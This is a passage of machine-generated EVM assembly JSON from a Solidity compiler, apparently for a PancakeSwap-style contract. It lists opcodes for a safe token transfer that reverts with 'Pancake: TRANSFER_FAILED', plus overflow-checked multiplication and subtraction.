										},
										{
											"begin": 18733,
											"end": 18741,
											"name": "AND"
										},
										{
											"begin": 18584,
											"end": 18591,
											"name": "PUSH [tag]",
											"value": "186"
										},
										{
											"begin": 18584,
											"end": 18751,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18584,
											"end": 18751,
											"name": "tag",
											"value": "318"
										},
										{
											"begin": 18584,
											"end": 18751,
											"name": "JUMPDEST"
										},
										{
											"begin": 1292,
											"end": 1293,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1281,
											"end": 1289,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1281,
											"end": 1293,
											"name": "SSTORE"
										},
										{
											"begin": 18544,
											"end": 18758,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1914,
											"end": 2252,
											"name": "tag",
											"value": "149"
										},
										{
											"begin": 1914,
											"end": 2252,
											"name": "JUMPDEST"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP1"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "MLOAD"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP1"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP3"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "ADD"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP3"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP2"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "PUSH",
											"value": "7472616E7366657228616464726573732C75696E743235362900000000000000"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "SWAP2"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP3"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "ADD"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP2"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP6"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP2"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "AND"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP4"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "ADD"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "MSTORE"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP1"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP4"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "ADD"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP7"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "SWAP1"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "MSTORE"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP5"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP5"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "SWAP1"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "SWAP3"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "ADD"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "DUP5"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "MSTORE"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "SWAP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "DUP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "DUP1"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "DUP2"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "SWAP3"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "MLOAD"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "DUP2"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "MLOAD"
										},
										{
											"begin": 1995,
											"end": 2007,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1995,
											"end": 2007,
											"name": "SWAP5"
										},
										{
											"begin": 2009,
											"end": 2026,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 2009,
											"end": 2026,
											"name": "SWAP5"
										},
										{
											"begin": 2030,
											"end": 2040,
											"name": "DUP10"
										},
										{
											"begin": 2030,
											"end": 2040,
											"name": "AND"
										},
										{
											"begin": 2030,
											"end": 2040,
											"name": "SWAP4"
										},
										{
											"begin": 2054,
											"end": 2097,
											"name": "SWAP3"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "SWAP2"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "DUP3"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "SWAP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "SWAP1"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "DUP1"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "DUP4"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "DUP4"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "326"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4"
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "328"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "DUP1"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "DUP3"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP1"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP3"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "ADD"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP2"
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "DUP3"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "326"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "328"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4"
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB"
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP"
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB"
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1"
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT"
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3"
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD"
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND"
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2"
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5"
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD"
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1"
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3"
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR"
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6"
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "SWAP1"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "ADD"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "SWAP2"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "MLOAD"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "DUP1"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "DUP4"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "SUB"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "DUP2"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "DUP7"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "GAS"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "CALL"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "SWAP2"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2030,
											"end": 2107,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 14,
											"end": 15,
											"name": "DUP1"
										},
										{
											"begin": 21,
											"end": 22,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "DUP2"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "EQ"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "PUSH [tag]",
											"value": "330"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "JUMPI"
										},
										{
											"begin": 75,
											"end": 79,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 69,
											"end": 80,
											"name": "MLOAD"
										},
										{
											"begin": 64,
											"end": 80,
											"name": "SWAP2"
										},
										{
											"begin": 64,
											"end": 80,
											"name": "POP"
										},
										{
											"begin": 144,
											"end": 148,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 140,
											"end": 149,
											"name": "NOT"
										},
										{
											"begin": 133,
											"end": 137,
											"name": "PUSH",
											"value": "3F"
										},
										{
											"begin": 115,
											"end": 131,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 111,
											"end": 138,
											"name": "ADD"
										},
										{
											"begin": 107,
											"end": 150,
											"name": "AND"
										},
										{
											"begin": 104,
											"end": 105,
											"name": "DUP3"
										},
										{
											"begin": 100,
											"end": 151,
											"name": "ADD"
										},
										{
											"begin": 94,
											"end": 98,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 87,
											"end": 152,
											"name": "MSTORE"
										},
										{
											"begin": 169,
											"end": 185,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 166,
											"end": 167,
											"name": "DUP3"
										},
										{
											"begin": 159,
											"end": 186,
											"name": "MSTORE"
										},
										{
											"begin": 225,
											"end": 241,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 222,
											"end": 223,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 215,
											"end": 219,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 212,
											"end": 213,
											"name": "DUP5"
										},
										{
											"begin": 208,
											"end": 220,
											"name": "ADD"
										},
										{
											"begin": 193,
											"end": 242,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "329"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "JUMP"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "tag",
											"value": "330"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "JUMPDEST"
										},
										{
											"begin": 36,
											"end": 40,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 31,
											"end": 40,
											"name": "SWAP2"
										},
										{
											"begin": 31,
											"end": 40,
											"name": "POP"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "tag",
											"value": "329"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 1994,
											"end": 2107,
											"name": "SWAP2"
										},
										{
											"begin": 1994,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 1994,
											"end": 2107,
											"name": "SWAP2"
										},
										{
											"begin": 1994,
											"end": 2107,
											"name": "POP"
										},
										{
											"begin": 2138,
											"end": 2145,
											"name": "DUP2"
										},
										{
											"begin": 2138,
											"end": 2195,
											"name": "DUP1"
										},
										{
											"begin": 2138,
											"end": 2195,
											"name": "ISZERO"
										},
										{
											"begin": 2138,
											"end": 2195,
											"name": "PUSH [tag]",
											"value": "332"
										},
										{
											"begin": 2138,
											"end": 2195,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2150,
											"end": 2161,
											"name": "DUP1"
										},
										{
											"begin": 2150,
											"end": 2161,
											"name": "MLOAD"
										},
										{
											"begin": 2150,
											"end": 2166,
											"name": "ISZERO"
										},
										{
											"begin": 2150,
											"end": 2166,
											"name": "DUP1"
										},
										{
											"begin": 2150,
											"end": 2194,
											"name": "PUSH [tag]",
											"value": "332"
										},
										{
											"begin": 2150,
											"end": 2194,
											"name": "JUMPI"
										},
										{
											"begin": 2150,
											"end": 2194,
											"name": "POP"
										},
										{
											"begin": 2181,
											"end": 2185,
											"name": "DUP1"
										},
										{
											"begin": 2170,
											"end": 2194,
											"name": "DUP1"
										},
										{
											"begin": 2170,
											"end": 2194,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2170,
											"end": 2194,
											"name": "ADD"
										},
										{
											"begin": 2170,
											"end": 2194,
											"name": "SWAP1"
										},
										{
											"begin": 2170,
											"end": 2194,
											"name": "MLOAD"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "333"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "333"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2170,
											"end": 2194,
											"name": "MLOAD"
										},
										{
											"begin": 2150,
											"end": 2194,
											"name": "tag",
											"value": "332"
										},
										{
											"begin": 2150,
											"end": 2194,
											"name": "JUMPDEST"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH [tag]",
											"value": "334"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "JUMPI"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "DUP1"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "DUP2"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "MSTORE"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "DUP3"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "ADD"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "MSTORE"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH",
											"value": "18"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "DUP3"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "ADD"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "MSTORE"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH",
											"value": "50616E63616B653A205452414E534645525F4641494C45440000000000000000"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "DUP3"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "ADD"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "MSTORE"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "SWAP1"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "MLOAD"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "SWAP1"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "DUP2"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "SWAP1"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "SUB"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "ADD"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "SWAP1"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "REVERT"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "tag",
											"value": "334"
										},
										{
											"begin": 2117,
											"end": 2245,
											"name": "JUMPDEST"
										},
										{
											"begin": 1914,
											"end": 2252,
											"name": "POP"
										},
										{
											"begin": 1914,
											"end": 2252,
											"name": "POP"
										},
										{
											"begin": 1914,
											"end": 2252,
											"name": "POP"
										},
										{
											"begin": 1914,
											"end": 2252,
											"name": "POP"
										},
										{
											"begin": 1914,
											"end": 2252,
											"name": "POP"
										},
										{
											"begin": 1914,
											"end": 2252,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 481,
											"end": 630,
											"name": "tag",
											"value": "175"
										},
										{
											"begin": 481,
											"end": 630,
											"name": "JUMPDEST"
										},
										{
											"begin": 539,
											"end": 548,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "DUP2"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "ISZERO"
										},
										{
											"begin": 568,
											"end": 574,
											"name": "DUP1"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "PUSH [tag]",
											"value": "336"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP1"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP3"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "MUL"
										},
										{
											"begin": 597,
											"end": 598,
											"name": "DUP3"
										},
										{
											"begin": 592,
											"end": 593,
											"name": "DUP3"
										},
										{
											"begin": 583,
											"end": 588,
											"name": "DUP3"
										},
										{
											"begin": 592,
											"end": 593,
											"name": "DUP2"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "PUSH [tag]",
											"value": "337"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "JUMPI"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "INVALID"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "tag",
											"value": "337"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "JUMPDEST"
										},
										{
											"begin": 578,
											"end": 593,
											"name": "DIV"
										},
										{
											"begin": 578,
											"end": 598,
											"name": "EQ"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "tag",
											"value": "336"
										},
										{
											"begin": 568,
											"end": 598,
											"name": "JUMPDEST"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH [tag]",
											"value": "188"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "JUMPI"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6D756C2D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP3"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MSTORE"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "MLOAD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "DUP2"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SUB"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "ADD"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "SWAP1"
										},
										{
											"begin": 560,
											"end": 623,
											"name": "REVERT"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "tag",
											"value": "177"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP3"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "SUB"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP3"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP2"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "GT"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "ISZERO"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH [tag]",
											"value": "188"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "JUMPI"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "15"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D7375622D756E646572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "58"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SUB"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
